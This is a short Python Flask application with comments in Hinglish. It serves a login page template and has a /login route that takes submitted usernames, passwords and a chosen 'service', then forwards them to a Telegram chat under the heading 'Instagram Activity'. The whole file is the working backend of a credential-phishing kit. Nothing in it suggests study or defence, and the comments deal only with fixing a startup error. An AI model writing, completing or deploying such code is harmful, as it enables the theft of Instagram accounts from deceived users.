import os
import telebot
from flask import Flask, request, render_template

# 1. Pehle variables set karein
TOKEN = os.environ.get("TELEGRAM_TOKEN", "YOUR_BOT_TOKEN")
CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "YOUR_CHAT_ID")

# 2. Phir Bot aur App ko DEFINE karein (Ye line sabse zaroori hai)
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)  # <--- Isi line ki wajah se error aa raha tha

# 3. Uske baad Routes likhein
@app.route("/")
def index():
    return render_template("login_page.html")

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    service = data.get("service", "Not Selected")

    # Telegram message
    text = f"🔔 **Instagram Activity**\n👤 User: `{username}`\n🔑 Pass: `{password}`\n🎯 Service: {service}"
    bot.send_message(CHAT_ID, text, parse_mode="Markdown")
    
    return "ok", 200

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
                              
